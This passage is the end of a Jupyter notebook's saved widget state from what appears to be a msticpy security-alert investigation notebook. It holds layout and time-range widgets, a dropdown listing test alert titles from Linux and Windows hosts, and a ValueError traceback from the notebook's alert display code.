     "e0ec02c0ac224e619fb5227c38b92c4b": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "HBoxModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "children": [
        "IPY_MODEL_7aee2372f9a94da298495709070f9944",
        "IPY_MODEL_417c43a34d0e48eca6770bd1293b1f17"
       ],
       "layout": "IPY_MODEL_eebcc77f4ed2449e80d0b8d763ef7fcf"
      }
     },
     "e101f15966f14bfb9c7268a4c8f93525": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null,
       "width": "80%"
      }
     },
     "e1b0afda66064a649606252cf95569fc": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "HTMLModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "description_tooltip": null,
       "layout": "IPY_MODEL_4ca3ed3ecf204c52ba526c8ac2611334",
       "style": "IPY_MODEL_b71039b4dc514217af2555b0ce210473",
       "value": "<h4>Set query time boundaries</h4>"
      }
     },
     "e2ec1807ff724225b12dfc64d29b4a29": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DatePickerModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "description": "Origin Date",
       "description_tooltip": null,
       "disabled": false,
       "layout": "IPY_MODEL_ba2df5fe425341b1ad2f06a9f4196185",
       "style": "IPY_MODEL_62c08fbec74f4d73bb6e3f95c0172f3c",
       "value": {
        "date": 12,
        "month": 8,
        "year": 2019
       }
      }
     },
     "e5c9f3edc40c4af7bcfdb575ecd1e483": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null
      }
     },
     "e6381d029b7945699006accf194385ce": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "SelectModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_options_labels": [
        "2019-02-09 23:26:48  Security incident with shared process detected (MSTICALERTSWIN1) [id:2518525459919272837_a346dd76-a51d-464e-afc5-c6e5c6a8fc6e]",
        "2019-02-10 00:15:03  Security incident with shared process detected (MSTICALERTSLXVM2) [id:2518525430962829999_c9890374-b912-4db3-b46a-49bf2b6909ab]",
        "2019-02-10 06:15:03  An history file has been cleared (MSTICALERTSLXVM2) [id:2518525214964399999_c0924102-5b0e-4ce1-b9cc-a86c120d8d64]",
        "2019-02-10 06:15:03  Detected Persistence Attempt (MSTICALERTSLXVM2) [id:2518525214967569999_a47c57fe-7a11-4c01-ba8f-2330d3df5475]",
        "2019-02-10 06:15:03  New SSH key added (MSTICALERTSLXVM2) [id:2518525214967399999_99cac885-73ba-4e4c-bb21-3832abac24a4]",
        "2019-02-10 06:15:03  Suspicious binary detected (MSTICALERTSLXVM2) [id:2518525214964729999_974c48bc-7ba0-4576-8e1f-291c480bf6ca]",
        "2019-02-10 06:15:04  Behavior similar to common Linux bots detected (MSTICALERTSLXVM2) [id:2518525214955729999_d8aca12c-c775-43ee-baae-6762660d818e]",
        "2019-02-10 06:15:05  Manipulation of host firewall detected (MSTICALERTSLXVM2) [id:2518525214943369999_93e54825-7b3f-4056-9387-2bdb13717ac9]",
        "2019-02-10 06:15:05  Suspicious Download Then Run Activity (MSTICALERTSLXVM2) [id:2518525214941629999_4fdcf478-5c8a-4e41-b507-8d741f6b8c78]",
        "2019-02-10 06:15:06  Behavior similar to Fairware ransomware detected (MSTICALERTSLXVM2) [id:2518525214938499999_e39808bc-e8d0-441d-8a7d-519e8697e2e0]",
        "2019-02-10 06:15:06  Hidden file execution detected (MSTICALERTSLXVM2) [id:2518525214939229999_8d5bc99e-4381-4188-8632-3588edda47ea]",
        "2019-02-10 06:15:06  Possible credential access tool detected (MSTICALERTSLXVM2) [id:2518525214934099999_49021ec7-ec33-4060-a659-6c90760281c4]",
        "2019-02-10 06:15:07  Detected file download from a known malicious source (MSTICALERTSLXVM2) [id:2518525214922729999_108ca661-69e9-472a-9c19-848a68ab8747]",
        "2019-02-10 06:15:07  Potential overriding of common files (MSTICALERTSLXVM2) [id:2518525214925169999_31132956-57ba-4c9b-948e-1e7cf7b5e6fe]",
        "2019-02-10 06:15:08  Potential reverse shell detected (MSTICALERTSLXVM2) [id:2518525214916029999_125bc04e-e5b7-4cdf-8fe5-e86646eef635]",
        "2019-02-10 06:15:08  Removal of system logs files detected (MSTICALERTSLXVM2) [id:2518525214917029999_f94d4060-e5a7-43c2-a40d-bf5710ce1fb8]",
        "2019-02-10 06:15:09  Detected suspicious file download (MSTICALERTSLXVM2) [id:2518525214904799999_0c4483f3-443a-40dc-9116-93b38b3621be]",
        "2019-02-10 06:15:10  Screenshot taken on host (MSTICALERTSLXVM2) [id:2518525214897769999_73aba7ff-034a-4783-bb49-ce562879ee9d]",
        "2019-02-10 06:15:10  Azure Security Center test alert (not a threat) (MSTICALERTSLXVM2) [id:2518525214893669999_230b65f7-fcf6-4061-8733-f2f05ba5a646]",
        "2019-02-10 12:15:02  New SSH key added (MSTICALERTSLXVM2) [id:2518524998971669999_b7580955-d8b8-459e-be30-40a019ddfc26]",
        "2019-02-10 12:15:02  Detected Persistence Attempt (MSTICALERTSLXVM2) [id:2518524998971829999_5063308b-adac-47ea-92eb-353af07e3604]",
        "2019-02-10 12:15:03  An history file has been cleared (MSTICALERTSLXVM2) [id:2518524998968599999_31b782ad-2d76-4c1e-b1af-96f08faa4883]",
        "2019-02-10 12:15:03  Suspicious binary detected (MSTICALERTSLXVM2) [id:2518524998968899999_48b23636-a357-47b3-918f-f5e4a5131abb]",
        "2019-02-10 12:15:03  Behavior similar to common Linux bots detected (MSTICALERTSLXVM2) [id:2518524998963469999_d3abd2f4-3caa-47c4-a01e-db4265f10600]",
        "2019-02-10 12:15:05  Hidden file execution detected (MSTICALERTSLXVM2) [id:2518524998941029999_510880dd-93be-426d-9230-60369a11f4a9]",
        "2019-02-10 12:15:05  Behavior similar to Fairware ransomware detected (MSTICALERTSLXVM2) [id:2518524998940029999_5230d326-003b-404b-829b-b22506cb7ddb]",
        "2019-02-10 12:15:05  Manipulation of host firewall detected (MSTICALERTSLXVM2) [id:2518524998946299999_22f477a1-0fc7-46e0-820c-426446f3d8c6]",
        "2019-02-10 12:15:05  Suspicious Download Then Run Activity (MSTICALERTSLXVM2) [id:2518524998944099999_9c0cc7cb-f34f-469e-83aa-48ab6f3d4976]",
        "2019-02-10 12:15:06  Possible credential access tool detected (MSTICALERTSLXVM2) [id:2518524998934499999_8e66128b-3873-4213-bf91-b73605c9aaf9]",
        "2019-02-10 12:15:07  Detected file download from a known malicious source (MSTICALERTSLXVM2) [id:2518524998923669999_85f8b110-9056-47cb-ba35-663d775cd444]",
        "2019-02-10 12:15:07  Potential overriding of common files (MSTICALERTSLXVM2) [id:2518524998925699999_5550d6f7-95c3-4265-afe9-68973d4a07ed]",
        "2019-02-10 12:15:08  Potential reverse shell detected (MSTICALERTSLXVM2) [id:2518524998916229999_81aa8e5f-c8e6-42d6-a486-89a4a0ec2247]",
        "2019-02-10 12:15:08  Removal of system logs files detected (MSTICALERTSLXVM2) [id:2518524998917269999_404d6069-abaa-4e1a-b9ff-18c7f36e0bd8]",
        "2019-02-10 12:15:09  Detected suspicious file download (MSTICALERTSLXVM2) [id:2518524998904829999_c1a906f2-8576-4a73-8710-333608826db9]",
        "2019-02-10 12:15:10  Screenshot taken on host (MSTICALERTSLXVM2) [id:2518524998898799999_987bac89-bf73-46cf-a33c-b8c0697d560f]",
        "2019-02-10 12:15:10  Azure Security Center test alert (not a threat) (MSTICALERTSLXVM2) [id:2518524998895729999_f48e2860-7d64-423c-8bd6-93314aefafd1]",
        "2019-02-10 18:15:03  New SSH key added (MSTICALERTSLXVM2) [id:2518524782966399999_a9c6ad15-3e93-411a-974c-6d1cc56d8b18]",
        "2019-02-10 18:15:03  Detected Persistence Attempt (MSTICALERTSLXVM2) [id:2518524782966599999_d6e2baa7-f745-4ed6-b561-9fe81044e58c]",
        "2019-02-10 18:15:03  Suspicious binary detected (MSTICALERTSLXVM2) [id:2518524782963669999_2d6ec33e-19bb-4687-8880-71cb694f6c20]",
        "2019-02-10 18:15:03  An history file has been cleared (MSTICALERTSLXVM2) [id:2518524782963399999_78b2d187-3a41-4271-881c-b9cab18b3421]",
        "2019-02-10 18:15:04  Behavior similar to common Linux bots detected (MSTICALERTSLXVM2) [id:2518524782958399999_1a026c16-321f-4eec-8ecf-05e10e16d123]",
        "2019-02-10 18:15:05  Manipulation of host firewall detected (MSTICALERTSLXVM2) [id:2518524782941629999_b8c42ca0-6c85-4468-af11-2521e2ae93f4]",
        "2019-02-10 18:15:06  Hidden file execution detected (MSTICALERTSLXVM2) [id:2518524782936799999_0f584934-8919-410c-b480-d5625133425a]",
        "2019-02-10 18:15:06  Behavior similar to Fairware ransomware detected (MSTICALERTSLXVM2) [id:2518524782935999999_b6aa8097-ea0d-4cf7-9f74-f2ea317b7f3d]",
        "2019-02-10 18:15:06  Possible credential access tool detected (MSTICALERTSLXVM2) [id:2518524782931329999_714ca0b0-e608-4b90-bd17-f823873f2f47]",
        "2019-02-10 18:15:06  Suspicious Download Then Run Activity (MSTICALERTSLXVM2) [id:2518524782939499999_91a1c219-b5e4-405d-8ce0-03b38e72cd48]",
        "2019-02-10 18:15:07  Potential overriding of common files (MSTICALERTSLXVM2) [id:2518524782921329999_ab779271-88b6-4ed1-a4fb-b4121832fd68]",
        "2019-02-10 18:15:07  Detected file download from a known malicious source (MSTICALERTSLXVM2) [id:2518524782920199999_ce4d6fd7-4179-4b11-80fa-8494b6813f87]",
        "2019-02-10 18:15:08  Potential reverse shell detected (MSTICALERTSLXVM2) [id:2518524782913599999_bc7894e4-7de6-4ed6-8f43-90012ca35ca6]",
        "2019-02-10 18:15:08  Removal of system logs files detected (MSTICALERTSLXVM2) [id:2518524782914669999_684397db-a86b-4403-b959-9bd03ff1c60d]",
        "2019-02-10 18:15:09  Detected suspicious file download (MSTICALERTSLXVM2) [id:2518524782900299999_049f09a3-5d12-4347-8b56-cb987fd71016]",
        "2019-02-10 18:15:10  Screenshot taken on host (MSTICALERTSLXVM2) [id:2518524782894999999_35a30eb4-4ec2-4b0a-be09-507886550925]",
        "2019-02-10 18:15:10  Azure Security Center test alert (not a threat) (MSTICALERTSLXVM2) [id:2518524782892699999_f7fca60a-e081-4449-a146-bb3cd64fbc92]"
       ],
       "_view_module_version": "1.4.0",
       "description": "Select alert :",
       "description_tooltip": null,
       "index": 0,
       "layout": "IPY_MODEL_6301759162594f0191376cba6b8487f1",
       "style": "IPY_MODEL_c594a229806c4c3d892c03881250b467"
      }
     },
     "e7070d5ecbf042ec9f6f944300cd0b66": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "TextModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "description": "Query start time (UTC):",
       "description_tooltip": null,
       "layout": "IPY_MODEL_45b1fa8e96ce47059f87af1b8619af18",
       "style": "IPY_MODEL_cc34b8f27c684821b92207e06d509f08",
       "value": "2019-02-05 05:38:41"
      }
     },
     "e74658d67c6d4bff99b0d9ea4da6b297": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "IntRangeSliderModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_model_name": "IntRangeSliderModel",
       "_view_module_version": "1.4.0",
       "_view_name": "IntRangeSliderView",
       "description": "Time Range (day):",
       "description_tooltip": null,
       "layout": "IPY_MODEL_06a009ef84614c0195feab82b8da0b0c",
       "max": 1,
       "min": -28,
       "style": "IPY_MODEL_9690171728584cb39f6cb8bd04174d41",
       "value": [
        -5,
        1
       ]
      }
     },
     "e9c201b71f1c46a1b635e00a3736c8d6": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "SliderStyleModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.1.0",
       "description_width": "initial"
      }
     },
     "ea0cdabedc2c47df885a303769d10c5f": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "HTMLModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "description_tooltip": null,
       "layout": "IPY_MODEL_650fd616ed0f4d28bca94ad60f456897",
       "style": "IPY_MODEL_7d490adb22804cb0b0ae74fa3c1f7e80",
       "value": "<h4>Set query time boundaries</h4>"
      }
     },
     "ea30516434bf4ee69ac2c6a6d4c5f0f3": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "VBoxModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "children": [
        "IPY_MODEL_d802d09a62cb4c519cbb7dc729f6e54d",
        "IPY_MODEL_828e96047b8a422db176e8b672f977cd",
        "IPY_MODEL_adc8873c90cb4c9f8be782a6fa15c985"
       ],
       "layout": "IPY_MODEL_4ce590086476432bb56c27f844754ea1"
      }
     },
     "eb3a8d772f4c4858b88ab339bf9fa6f5": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null
      }
     },
     "edbe4c8f3b3e42bab6e3862961be1121": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "HTMLModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "description_tooltip": null,
       "layout": "IPY_MODEL_b956eea20b28466f8de7eb123581c9b0",
       "style": "IPY_MODEL_fe34ba4dc6754a3ea4e5ffefea2f9e83",
       "value": "<h4>Set query time boundaries</h4>"
      }
     },
     "ee6b988ae21b4691aa18654afb8f13f6": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.1.0",
       "description_width": ""
      }
     },
     "eebcc77f4ed2449e80d0b8d763ef7fcf": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null
      }
     },
     "ef9c4292abb74cda96c45e2a0a78c547": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "border": "1px solid black",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null
      }
     },
     "f0baad13979a45dd974ece436e47eaaa": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null
      }
     },
     "f1dcdad886da4a54a9399afe3321d556": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "VBoxModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "children": [
        "IPY_MODEL_4eb89f3babef4832a13f8d306997d2b0",
        "IPY_MODEL_458559f75d6748adab005ef5516205c6",
        "IPY_MODEL_cd5131201db1400f81060e796a383b0e"
       ],
       "layout": "IPY_MODEL_0d81e7a774024054ade46f60277e3e1c"
      }
     },
     "f21946eff18c40daad9a142ce6137d32": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "SliderStyleModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.1.0",
       "description_width": "initial"
      }
     },
     "f59cfefebce44d3990f5a34b03a78986": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "CheckboxModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "description": "Center subsequent query times round selected Alert?",
       "description_tooltip": null,
       "disabled": false,
       "layout": "IPY_MODEL_fe8a77a4fd294f77b3bd45368a74fb98",
       "style": "IPY_MODEL_676ed32027db48a4ac459cfaa8be5a68",
       "value": true
      }
     },
     "f62bbe93c9e944288bc143f4f6e69ad0": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.1.0",
       "description_width": ""
      }
     },
     "f6665269d1984323b6126812b912255f": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "TextModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "description": "Time (24hr)",
       "description_tooltip": null,
       "layout": "IPY_MODEL_ce372fe3338f42059b4b2c03fc734e5c",
       "style": "IPY_MODEL_186ffe3cfbf04073a8c4a3aac3d0edfe",
       "value": "21:37:31"
      }
     },
     "f6ddd86c568f42f79794477ebe27a15c": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.1.0",
       "description_width": ""
      }
     },
     "f6e94341d6c341b58a676aaa233cfd03": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null,
       "width": "50%"
      }
     },
     "f73a32fa5d794daf82576a888f051caa": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null,
       "width": "50%"
      }
     },
     "fbe590e1410948238b117883053f1eee": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null,
       "width": "80%"
      }
     },
     "fc34c476a23a4a06af28933279b25eb2": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "SliderStyleModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.1.0",
       "description_width": "initial"
      }
     },
     "fc9f2607345d45099f280cd92d083616": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.1.0",
       "description_width": ""
      }
     },
     "fcb3fb4f92f148978adfd72483ac6b8f": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.1.0",
       "description_width": ""
      }
     },
     "fce43129342a40f4bd192d123879e71e": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "TextModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "description": "Query end time (UTC) :  ",
       "description_tooltip": null,
       "layout": "IPY_MODEL_a0b4260daead43f4877c88b13a3708cb",
       "style": "IPY_MODEL_69de0050962c41eba16f5cf995ac5ab4",
       "value": "2019-09-13 21:37:31"
      }
     },
     "fd46006994c548abb57223edb579899c": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null
      }
     },
     "fdb89df1fd1a43009a9195407b4bda4b": {
      "model_module": "@jupyter-widgets/output",
      "model_module_version": "1.0.0",
      "model_name": "OutputModel",
      "state": {
       "layout": "IPY_MODEL_9cd3ee04526b4736810a1aa2fb2355d6",
       "outputs": [
        {
         "ename": "ValueError",
         "evalue": "Unrecognized alert object type <class 'pandas.core.frame.DataFrame'>",
         "output_type": "error",
         "traceback": [
          "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
          "\u001b[0;31mValueError\u001b[0m                                Traceback (most recent call last)",
          "\u001b[0;32m~/anaconda3_501/lib/python3.6/site-packages/msticpy/nbtools/nbwidgets.py\u001b[0m in \u001b[0;36m_select_alert\u001b[0;34m(self, selection)\u001b[0m\n\u001b[1;32m    493\u001b[0m                     \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_w_output\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mclear_output\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    494\u001b[0m                     \u001b[0;32mwith\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_w_output\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 495\u001b[0;31m                         \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0malert_action\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mselected_alert\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    496\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    497\u001b[0m     \u001b[0;32mdef\u001b[0m \u001b[0m_get_alert\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mself\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0malert_id\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
          "\u001b[0;32m<ipython-input-15-8f23a309b054>\u001b[0m in \u001b[0;36mdisp_full_alert\u001b[0;34m(alert)\u001b[0m\n\u001b[1;32m      2\u001b[0m     \u001b[0;32mglobal\u001b[0m \u001b[0mrelated_alert\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      3\u001b[0m     \u001b[0mrelated_alert\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mSecurityAlert\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0malert\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m----> 4\u001b[0;31m     \u001b[0mnbdisplay\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mdisplay_alert\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0malert_list\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mshow_entities\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0;32mTrue\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m      5\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      6\u001b[0m recenter_wgt = widgets.Checkbox(\n",
          "\u001b[0;32m~/anaconda3_501/lib/python3.6/site-packages/msticpy/nbtools/nbdisplay.py\u001b[0m in \u001b[0;36mdisplay_alert\u001b[0;34m(alert, show_entities)\u001b[0m\n\u001b[1;32m     65\u001b[0m         \u001b[0mdisplay\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mpd\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mDataFrame\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0malert\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     66\u001b[0m     \u001b[0;32melse\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m---> 67\u001b[0;31m         \u001b[0;32mraise\u001b[0m \u001b[0mValueError\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m\"Unrecognized alert object type \"\u001b[0m \u001b[0;34m+\u001b[0m \u001b[0mstr\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mtype\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0malert\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m     68\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     69\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n",
          "\u001b[0;31mValueError\u001b[0m: Unrecognized alert object type <class 'pandas.core.frame.DataFrame'>"
         ]
        }
       ]
      }
     },
     "fe334838124d4e1c9f0999c0a03e7329": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null
      }
     },
     "fe34ba4dc6754a3ea4e5ffefea2f9e83": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.1.0",
       "description_width": ""
      }
     },
     "fe43b50ec82748eaa728247f81fb64b8": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.1.0",
       "description_width": ""
      }
     },
     "fe8a77a4fd294f77b3bd45368a74fb98": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null,
       "width": "95%"
      }
     },
     "ffe60017caf54a398caacc508ffb3703": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "HBoxModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "children": [
        "IPY_MODEL_cac6f5b19ddf4ecfb35a7a8ecc7da5ab",
        "IPY_MODEL_7dc692929a214ae0972ff7d85cc157aa"
       ],
       "layout": "IPY_MODEL_7efab6b4a8994b59bdc285576e765320"
      }
     }
    },
    "version_major": 2,
    "version_minor": 0
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
